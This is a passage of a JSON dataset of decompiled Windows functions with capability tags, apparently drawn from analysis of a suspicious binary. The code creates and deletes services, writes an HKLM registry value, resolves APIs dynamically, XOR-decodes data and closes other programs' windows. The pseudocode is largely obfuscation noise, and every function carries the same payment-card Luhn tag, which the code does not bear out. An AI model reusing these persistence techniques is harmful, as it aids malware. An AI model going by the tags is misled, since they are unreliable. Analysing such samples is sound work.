        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401ece) overlaps instruction at (ram,0x00401ecb)\n// \n\nulong fcn.00401e90(uint *param_1, uint *param_2)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    char *pcVar7;\n    uint32_t uVar8;\n    uint uVar9;\n    uint16_t uVar10;\n    int32_t iVar11;\n    uint32_t extraout_ECX;\n    uint32_t uVar12;\n    int32_t *piVar13;\n    uint32_t unaff_EBX;\n    uint *puVar14;\n    uint *unaff_ESI;\n    uint *puVar15;\n    uint *puVar16;\n    ushort in_SS;\n    uint8_t uVar17;\n    bool bVar18;\n    uint8_t in_AF;\n    bool bVar19;\n    bool bVar20;\n    bool bVar21;\n    bool bVar22;\n    unkbyte10 extraout_ST0;\n    unkbyte10 Var23;\n    unkbyte10 extraout_ST1;\n    uchar *in_stack_ffffff78;\n    uint in_stack_ffffff7c;\n    ushort in_stack_ffffff80;\n    ushort in_stack_ffffff82;\n    ushort uVar24;\n    ushort uVar25;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    puVar14 = &stack0xfffffffc;\n    pcVar7 = NULL;\n    var_4h = 0;\n    var_68h = 0;\n    puVar15 = &var_67h;\n    for (iVar11 = 0x18; iVar11 != 0; iVar11 = iVar11 + -1) {\n        *puVar15 = 0;\n        puVar15 = puVar15 + 1;\n    }\n    while( true ) {\n        *puVar15 = pcVar7;\n        *(puVar15 + 2) = pcVar7;\n        uVar17 = 0;\n        bVar21 = false;\n        iVar11 = fcn.00401f10(&var_68h, &var_4h);\n        if (bVar21) break;\n        uVar24 = extraout_ECX;\n        uVar25 = extraout_ECX >> 0x10;\n        if (!bVar21) break;\n        puVar16 = puVar15 + 7;\n        *(puVar15 + 3) = *unaff_ESI;\n        uVar3 = *0x10680000;\n        piVar13 = 0x68fc558b;\n        uVar5 = iVar11 + 2U & 0xffffff00;\n        uVar8 = uVar5 | *0x10680000;\n        if (!SCARRY4(iVar11 + 1, 1)) goto code_r0x00401eea;\n        puVar1 = puVar15 + extraout_ECX + 0x6d;\n        uVar2 = *puVar1 + 0x55;\n        bVar21 = 0xaa < *puVar1 || CARRY1(uVar2, uVar17);\n        bVar22 = SCARRY1(*puVar1, 'U') != SCARRY1(uVar2, uVar17);\n        *puVar1 = uVar2 + uVar17;\n        bVar20 = *puVar1 < '\\0';\n        bVar19 = *puVar1 == 0;\n        uVar17 = POPCOUNT(*puVar1);\n        uVar6 = extraout_ECX & 0xffff;\n        uVar12 = (extraout_ECX >> 8 & 0xffff00) << 8 | uVar6;\n        if (bVar19) {\n            puVar16 = CONCAT22(uVar24, in_SS);\n            in_stack_ffffff82 = 0x47;\n            bVar21 = 0x9703aa74 < &stack0xfffffffc;\n            bVar22 = SCARRY4(&stack0xfffffffc, 0x68fc558b);\n            piVar13 = &stack0x68fc5587;\n            bVar20 = piVar13 < 0;\n            bVar19 = piVar13 == NULL;\n            uVar17 = POPCOUNT(piVar13 & 0xff);\n        }\n        else {\n            *(unaff_EBX + 1) = 0xea;\n        }\n        bVar18 = (uVar17 & 1) != 0;\n        if ((bVar19 || bVar22 != bVar20) || (!bVar19 && bVar22 == bVar20)) {\n            *(unaff_EBX + 2) = 0x91;\n            if ((bVar18) && (!bVar18)) {\n                puVar15 = &stack0xffffff8c;\n                cVar4 = '\\x1e';\n                do {\n                    puVar14 = puVar14 + -1;\n                    puVar15 = puVar15 + -1;\n                    *puVar15 = *puVar14;\n                    cVar4 = cVar4 + -1;\n                } while ('\\0' < cVar4);\n                uVar9 = in(0x78);\n                return CONCAT44(piVar13, uVar9);\n            }\n            *(unaff_EBX + 3) = 0xe8;\n            if ((bVar22 == bVar20) && (uVar10 = uVar6,  uVar12 = uVar6,  bVar22 != bVar20)) {\n                *(uVar8 + 0x8316dbec) = extraout_ST0;\n                uVar17 = uVar8 - 1;\n                in_AF = 9 < (uVar17 & 0xf) | in_AF;\n                uVar17 = uVar17 + in_AF * '\\x06';\n                *piVar13 = *piVar13 + 0x43c6df84;\n                uVar8 = uVar8 - 1 & 0xffffff00 |\n                        uVar17 + (0x90 < (uVar17 & 0xf0) | bVar21 | in_AF * (0xf9 < uVar17)) * '`' + 0x2c;\n                Var23 = extraout_ST1;\n            }\n            else {\n                uVar10 = uVar12;\n                *(unaff_EBX + 4) = 0x2c;\n                Var23 = extraout_ST0;\n            }\n            *(unaff_EBX + 5) = 0xf9;\n            bVar21 = -1 < (piVar13 - 1U & uVar10);\n            *(unaff_EBX + 6) = 0x7b;\n            if ((bVar21) && (!bVar21)) {\n                *(puVar16 | &stack0xfffffffc) = uVar8;\n                piVar13 = piVar13 & 0xffffff00;\n                uVar8 = uVar8 & 0xffff0000 | uVar8 + (uVar8 >> 8) * 'y';\n            }\n            *(unaff_EBX + 7) = 0x2a;\n            bVar21 = (piVar13 ^ unaff_EBX >> 8 | 0x67) < '\\0';\n            *(unaff_EBX + 8) = 0xac;\n            if ((bVar21) || (!bVar21)) {\n                *(unaff_EBX + 9) = 0xe3;\n            }\n            else {\n                *(uVar8 + 0x8316dbec) = Var23;\n                *piVar13 = *piVar13 + 0x43c6df84;\n                unaff_EBX = unaff_EBX | &stack0xffffff90;\n            }\n            *(unaff_EBX + 10) = 0xb6;\n            *param_2 = 0xb;\n            return CONCAT44(piVar13, param_2);\n        }\n        in_AF = 9 < (uVar3 & 0xf) | in_AF;\n        uVar3 = uVar3 + in_AF * '\\x06';\n        pcVar7 = iVar11 + 2U & 0xffff0000 | CONCAT11((uVar5 >> 8) + in_AF, uVar3) & 0xff0f;\n        if (uVar12 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        *pcVar7 = *pcVar7 + (uVar3 & 0xf);\n        unaff_ESI = unaff_ESI + 1;\n        puVar15 = puVar16;\n    }\n    uVar24 = 0xa040;\n    uVar25 = 0;\n    in_stack_ffffff80 = 0x7010;\n    in_stack_ffffff82 = 0x40;\n    in_stack_ffffff78 = &var_68h;\n    in_stack_ffffff7c = var_4h;\ncode_r0x00401eea:\n    uVar9 = fcn.004022b0(in_stack_ffffff78, in_stack_ffffff7c, CONCAT22(in_stack_ffffff82, in_stack_ffffff80), \n                         CONCAT22(uVar25, uVar24));\n    *param_1 = 0x407010;\n    *param_2 = 0xa040;\n    return CONCAT44(param_2, uVar9);\n}\n",
        "token_count": 2078
    },
    "00401f10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401f2a) overlaps instruction at (ram,0x00401f28)\n// \n// WARNING: Variable defined which should be unmapped: var_4h\n\nulong __cdecl fcn.00401f10(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint uVar4;\n    uint32_t in_EAX;\n    uint8_t *puVar5;\n    ushort uVar6;\n    uint16_t uVar7;\n    uint32_t in_ECX;\n    int32_t *in_EDX;\n    uchar *puVar8;\n    uchar **ppuVar9;\n    uchar **ppuVar10;\n    uint *unaff_ESI;\n    uint *puVar11;\n    uint *unaff_EDI;\n    uint *puVar12;\n    ushort in_SS;\n    bool bVar13;\n    uint8_t in_CF;\n    uchar in_PF;\n    uint8_t in_AF;\n    uchar in_ZF;\n    char in_SF;\n    char in_OF;\n    unkbyte10 in_ST0;\n    unkbyte10 in_ST1;\n    uint uStackY24187;\n    ushort uStackY24183;\n    ushort uStackY24181;\n    uint in_stack_ffffa18d;\n    uint in_stack_ffffa191;\n    uint in_stack_ffffa195;\n    uint in_stack_ffffa199;\n    uint var_68h;\n    uchar *apuStack24 [2];\n    uint var_4h;\n    \n    puVar12 = &stack0xfffffffc;\n    ppuVar10 = &stack0xfffffffc;\n    if ((!in_ZF) && (ppuVar10 = &stack0xfffffffc,  in_ZF)) {\n        ppuVar9 = apuStack24 + 1;\n        ppuVar10 = apuStack24 + 1;\n        apuStack24[1] = &stack0xfffffffc;\n        cVar2 = '\\x10';\n        do {\n            puVar12 = puVar12 + -1;\n            ppuVar9 = ppuVar9 + -1;\n            *ppuVar9 = *puVar12;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n    }\n    puVar8 = ppuVar10[2];\n    *puVar8 = 0x10;\n    puVar12 = unaff_EDI;\n    if (in_ZF) goto code_r0x00401f3c;\n    do {\n        uVar6 = in_ECX;\n        in_ECX = (in_ECX >> 8 & 0xffff00) << 8 | in_ECX & 0xffff;\n        puVar12 = unaff_EDI;\n        if (in_ZF) {\n            puVar12 = CONCAT22(uVar6, in_SS);\n            in_stack_ffffa18d = 0x47;\n            in_CF = CARRY4(in_EDX, ppuVar10);\n            in_OF = SCARRY4(in_EDX, ppuVar10);\n            in_EDX = in_EDX + ppuVar10;\n            in_SF = in_EDX < 0;\n            in_ZF = in_EDX == NULL;\n            in_PF = (POPCOUNT(in_EDX & 0xff) & 1U) == 0;\n            puVar11 = unaff_ESI;\n        }\n        else {\ncode_r0x00401f3c:\n            puVar8[1] = 0xea;\n            puVar11 = unaff_ESI;\n        }\n        if ((in_ZF || in_OF != in_SF) || (!in_ZF && in_OF == in_SF)) {\n            puVar8[2] = 0x91;\n            if ((!in_PF) && (in_PF)) {\n                puVar12 = &uStackY24183;\n                cVar2 = '\\x1e';\n                do {\n                    ppuVar10 = ppuVar10 + -1;\n                    puVar12 = puVar12 + -1;\n                    *puVar12 = *ppuVar10;\n                    cVar2 = cVar2 + -1;\n                } while ('\\0' < cVar2);\n                uVar4 = in(0x78);\n                return CONCAT44(in_EDX, uVar4);\n            }\n            puVar8[3] = 0xe8;\n            if (in_OF == in_SF) {\n                in_ECX = in_ECX & 0xffff;\n                uVar7 = in_ECX;\n                if (in_OF != in_SF) {\n                    *(in_EAX + 0x8316dbec) = in_ST0;\n                    uVar3 = in_EAX - 1;\n                    uVar1 = 9 < (uVar3 & 0xf) | in_AF;\n                    uVar3 = uVar3 + uVar1 * '\\x06';\n                    *in_EDX = *in_EDX + 0x43c6df84;\n                    in_EAX = in_EAX - 1 & 0xffffff00 |\n                             uVar3 + (0x90 < (uVar3 & 0xf0) | in_CF | uVar1 * (0xf9 < uVar3)) * '`' + 0x2c;\n                    in_ST0 = in_ST1;\n                    goto code_r0x00401f8f;\n                }\n            }\n            uVar7 = in_ECX;\n            puVar8[4] = 0x2c;\ncode_r0x00401f8f:\n            puVar8[5] = 0xf9;\n            bVar13 = -1 < (in_EDX - 1U & uVar7);\n            puVar8[6] = 0x7b;\n            if ((bVar13) && (!bVar13)) {\n                *(puVar12 | ppuVar10) = in_EAX;\n                in_EDX = in_EDX & 0xffffff00;\n                in_EAX = in_EAX & 0xffff0000 | in_EAX + (in_EAX >> 8) * 'y';\n            }\n            puVar8[7] = 0x2a;\n            bVar13 = (in_EDX ^ puVar8 >> 8 | 0x67) < '\\0';\n            puVar8[8] = 0xac;\n            if ((bVar13) || (!bVar13)) {\n                puVar8[9] = 0xe3;\n            }\n            else {\n                *(in_EAX + 0x8316dbec) = in_ST0;\n                *in_EDX = *in_EDX + 0x43c6df84;\n                puVar8 = puVar8 | &stack0xffffa18d;\n            }\n            puVar8[10] = 0xb6;\n            puVar12 = ppuVar10[3];\n            *puVar12 = 0xb;\n            return CONCAT44(in_EDX, puVar12);\n        }\n        in_AF = 9 < (in_EAX & 0xf) | in_AF;\n        uVar1 = in_EAX + in_AF * '\\x06';\n        uVar3 = uVar1 & 0xf;\n        puVar5 = in_EAX & 0xffff0000 | CONCAT11((in_EAX >> 8) + in_AF, uVar1) & 0xff0f;\n        if (in_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        bVar13 = CARRY1(*puVar5, uVar3);\n        uVar1 = *puVar5;\n        *puVar5 = *puVar5 + uVar3;\n        if ((SCARRY1(uVar1, uVar3)) || (!SCARRY1(uVar1, uVar3))) {\ncode_r0x00401eea:\n            *(ppuVar10 + 0x50529845) = *(ppuVar10 + 0x50529845);\n            uStackY24183 = 0x1ef5;\n            uStackY24181 = 0x40;\n            uVar4 = fcn.004022b0(in_stack_ffffa18d, in_stack_ffffa191, in_stack_ffffa195, in_stack_ffffa199);\n            puVar12 = ppuVar10[3];\n            *ppuVar10[2] = 0x407010;\n            *puVar12 = 0xa040;\n            return CONCAT44(puVar12, uVar4);\n        }\n        unaff_EDI = puVar12 + 1;\n        unaff_ESI = puVar11 + 1;\n        *puVar12 = *puVar11;\n        in_EDX = 0x68fc558b;\n        in_EAX = puVar5 + 2 & 0xffffff00 | *0x10680000;\n        if (!SCARRY4(puVar5 + 1, 1)) goto code_r0x00401eea;\n        puVar5 = puVar12 + 0x6a;\n        uVar1 = *puVar5 + 0x55;\n        in_CF = 0xaa < *puVar5 || CARRY1(uVar1, bVar13);\n        in_OF = SCARRY1(*puVar5, 'U') != SCARRY1(uVar1, bVar13);\n        *puVar5 = uVar1 + bVar13;\n        in_SF = *puVar5 < '\\0';\n        in_ZF = *puVar5 == 0;\n        in_PF = (POPCOUNT(*puVar5) & 1U) == 0;\n    } while( true );\n}\n",
        "token_count": 2136
    },
    "00402050": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004020bc)\n\nuint __cdecl fcn.00402050(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    if (iVar1 != 0) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 153
    },
    "00402240": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040229d) overlaps instruction at (ram,0x00402299)\n// \n\nint32_t __cdecl fcn.00402240(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    char cVar4;\n    char cVar5;\n    float10 extraout_ST0;\n    float10 fVar6;\n    float10 extraout_ST0_00;\n    uint64_t uVar7;\n    double in_stack_ff5692c5;\n    \n    uVar7 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    iVar2 = uVar7;\n    cVar5 = '\\0';\n    cVar4 = iVar2 < 0;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    if ((iVar2 < 1) || (0 < iVar2)) {\n        uVar7 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar2);\n        fVar6 = extraout_ST0_00;\n    }\n    else {\n        fVar6 = extraout_ST0 - in_stack_ff5692c5;\n        pcVar1 = sym.imp.ADVAPI32.dll_DeleteService + iVar2;\n        uVar7 = uVar7 & 0xffffffff00000000 | ZEXT48(pcVar1);\n        cVar5 = SCARRY4(iVar2, 0x406008) != SCARRY4(pcVar1, 0);\n        cVar4 = pcVar1 < 0;\n    }\n    piVar3 = uVar7 >> 0x20;\n    if ((cVar5 == cVar4) && (cVar5 != cVar4)) {\n        *(uVar7 + -0x7ce92414) = fVar6;\n        *piVar3 = *piVar3 + -0xa9207c;\n    }\n    else {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    }\n    return uVar7;\n}\n",
        "token_count": 467
    },
    "00402330": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402392) overlaps instruction at (ram,0x00402391)\n// \n\nbool fcn.00402330(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t extraout_ECX;\n    uint32_t uVar3;\n    char *pcVar4;\n    uint8_t *unaff_EBX;\n    uint32_t unaff_EDI;\n    char *pcVar5;\n    ulong uVar6;\n    char *var_4h;\n    \n    var_4h = NULL;\n    uVar6 = fcn.00404a80(&var_4h);\n    pcVar4 = uVar6 >> 0x20;\n    iVar2 = uVar6;\n    if (iVar2 == 0) {\n        return false;\n    }\n    if ((-1 < iVar2) && (-1 >= iVar2)) {\n        *(unaff_EDI | &stack0xfffffffc) = uVar6;\n        pcVar4 = pcVar4 & 0xffffff00;\n    }\n    if (var_4h == NULL) {\n        return false;\n    }\n    if ((var_4h < 0) || (var_4h >= 0)) {\n        uVar3 = 0xffffffff;\n        pcVar5 = var_4h;\n        do {\n            pcVar4 = var_4h;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n    }\n    else {\n        *unaff_EBX = *unaff_EBX & 0xc3;\n        *(unaff_EBX + -0xd3fcc06) = *(unaff_EBX + -0xd3fcc06) + -1;\n        uVar3 = extraout_ECX;\n    }\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x411230, 0x411270, 1, pcVar4, ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 486
    },
    "00402690": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00402690(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x41115c);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    *0x4224f8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x41116c);\n    *0x4224fc = (*pcVar1)(iVar2, 0x411188);\n    *0x422500 = (*pcVar1)(iVar2, 0x411198);\n    if (((*0x4224f8 != 0) && (*0x4224fc != 0)) && (*0x422500 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 202
    },
    "00402950": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004029c1) overlaps instruction at (ram,0x004029bd)\n// \n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00402950(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint8_t uVar1;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_2h;\n    \n    var_10h._0_1_ = arg_14h * '\\x02';\n    var_8h = 0;\n    if (0 < arg_14h) {\n        var_ch = 1;\n        do {\n            uVar1 = *(var_ch % arg_ch + arg_8h);\n            *(arg_18h + -1 + var_ch) = var_10h ^ *(var_8h + arg_10h) ^ *((var_ch + -1) % arg_ch + arg_8h);\n            *(var_ch + arg_18h) = var_10h ^ uVar1;\n            var_8h = var_8h + 1;\n            var_ch = var_ch + 2;\n        } while (var_8h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 336
    },
    "00402e30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402e64) overlaps instruction at (ram,0x00402e63)\n// \n// WARNING: Removing unreachable block (ram,0x00402e44)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00402e30(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t extraout_ECX;\n    int32_t iVar1;\n    int32_t extraout_ECX_00;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    bool bVar2;\n    \n    bVar2 = SBORROW4(arg_ch, 1);\n    if (arg_ch == 1) {\n        func_0x00401290();\n        if ((bVar2) || (iVar1 = extraout_ECX,  !bVar2)) {\n            fcn.00402a60();\n            iVar1 = extraout_ECX_00;\n        }\n        *unaff_EDI = *unaff_ESI;\n        (**(iVar1 + 0x52))();\n        fcn.00404720();\n        if (*0x422508 == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.00404bb0();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 334
    },
    "00403870": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040387c) overlaps instruction at (ram,0x0040387b)\n// \n\nint32_t __fastcall fcn.00403870(int32_t param_1, int32_t param_2)\n\n{\n    char unaff_BL;\n    bool in_PF;\n    \n    if (!in_PF) {\n        if (in_PF) {\n            *(param_1 + 0x5b9) = *(param_1 + 0x5b9) + unaff_BL;\n            goto code_r0x0040388a;\n        }\n    }\n    param_2 = (*_sym.imp.MSVCRT.dll_rand)();\n    param_2 = param_2 % 5;\ncode_r0x0040388a:\n    return param_2 + 3;\n}\n",
        "token_count": 176
    },
    "00403a30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403a94) overlaps instruction at (ram,0x00403a92)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nint32_t * __fastcall fcn.00403a30(uint param_1, char param_2, uint param_3, uint32_t param_4)\n\n{\n    code *pcVar1;\n    uint8_t uVar4;\n    uint in_EAX;\n    uint32_t *hSCManager;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint16_t extraout_CX;\n    uint8_t uVar5;\n    int32_t unaff_EBX;\n    uint *puVar6;\n    bool bVar7;\n    char cVar8;\n    char cVar9;\n    uint32_t uStackY36;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    \n    uVar5 = param_2 + 0x15;\n    uVar4 = in_EAX >> 8;\n    bVar7 = uVar5 < uVar4;\n    cVar9 = SBORROW1(uVar5, uVar4);\n    cVar8 = uVar5 - uVar4 < '\\0';\n    uStack16 = 0xf003f;\n    uStack20 = 0;\n    uStack24 = 0;\n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n    if ((!bVar7) && (bVar7)) {\n        piVar2 = hSCManager + 1;\n        if (&stack0xffffffe8 < *hSCManager || piVar2 == NULL) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *piVar2 = *piVar2 + piVar2;\n        return piVar2;\n    }\n    uStackY36 = 0x403a7f;\n    uVar3 = fcn.00402240(hSCManager, param_3);\n    if ((cVar9 != cVar8) || (uStackY36 = uStackY36 & 0xffff | extraout_CX << 0x10,  cVar9 == cVar8)) {\n        uStackY36 = param_4;\n        uVar3 = param_4;\n    }\n    puVar6 = &stack0xffffffdc ^ *(unaff_EBX + -0x75);\n    puVar6[-1] = param_3;\n    puVar6[-2] = uVar3;\n    puVar6[-3] = 0x403a9f;\n    piVar2 = fcn.00402050(puVar6[-2], puVar6[-1], *puVar6);\n    puVar6[2] = uVar3;\n    pcVar1 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n    puVar6[1] = 0x403aab;\n    (*pcVar1)();\n    return piVar2;\n}\n",
        "token_count": 672
    },
    "00403dd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403dd0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    bool in_CF;\n    bool in_ZF;\n    \n    if ((!in_CF && !in_ZF) && (in_CF || in_ZF)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    uVar2 = 0;\n    if (arg_ch != 0) {\n        do {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(uVar2 + arg_8h) = iVar1 % 0x1a + 'a';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 185
    },
    "00403ee0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403ee0(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 103
    },
    "00404010": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00404010(uchar *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uchar *puVar5;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.MSVCRT.dll__strlwr)(arg_8h);\n    var_14h = 0x411498;\n    var_10h = 0x411490;\n    var_ch = 0x4114a0;\n    var_8h = 0x4114a8;\n    var_4h = 0x4114b0;\n    puVar4 = &var_14h;\n    uVar2 = 0;\n    do {\n        iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h, *puVar4);\n        if (iVar1 != 0) {\n            return true;\n        }\n        uVar3 = uVar2 + 1;\n        puVar4 = puVar4 + 1;\n        iVar1 = uVar2 - 4;\n        uVar2 = uVar3;\n    } while (uVar3 < 5);\n    if ((4 < uVar3) && (SBORROW4(uVar3, 5) != iVar1 < 0)) {\n        puVar5 = arg_8h | &stack0xfffffffc;\n        arg_8h = puVar5 + 1;\n        *puVar5 = 0;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h, 0x411488);\n    return iVar1 == 0;\n}\n",
        "token_count": 399
    },
    "00404610": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404610(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(arg_8h, &var_4h);\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    var_108h = 0;\n    puVar2 = &var_107h;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)(arg_8h, &var_108h, 0x104);\n    iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, 0x41142c);\n    if (iVar1 != 0) {\n        return 1;\n    }\n    (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, 0x404590, 0);\n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    (*_sym.imp.KERNEL32.dll_Sleep)((iVar1 % 10 + 4) * 1000);\n    (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n    return 0;\n}\n",
        "token_count": 374
    },
    "00404a40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404a58) overlaps instruction at (ram,0x00404a54)\n// \n\nvoid __cdecl fcn.00404a40(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    uint in_ECX;\n    int32_t *in_EDX;\n    uint8_t in_CF;\n    uint8_t in_AF;\n    char in_SF;\n    char in_OF;\n    unkbyte10 in_ST0;\n    \n    if ((in_OF != in_SF) || (in_OF == in_SF)) {\n        in_EAX = arg_8h;\n    }\n    *(in_EAX + -0x7ce92414) = in_ST0;\n    uVar2 = in_EAX - 1U;\n    uVar1 = 9 < (uVar2 & 0xf) | in_AF;\n    uVar2 = uVar2 + uVar1 * '\\x06';\n    *in_EDX = *in_EDX + 0x458bdf84;\n    *in_EDX = *in_EDX | in_ECX >> 8;\n    (*_sym.imp.KERNEL32.dll_CreateFileA)\n              (in_EAX - 1U & 0xffffff00 | uVar2 + (0x90 < (uVar2 & 0xf0) | in_CF | uVar1 * (0xf9 < uVar2)) * '`', \n               0xc0000000, 1, 0, 3, 0x80);\n    return;\n}\n",
        "token_count": 353
    },
    "00404a80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
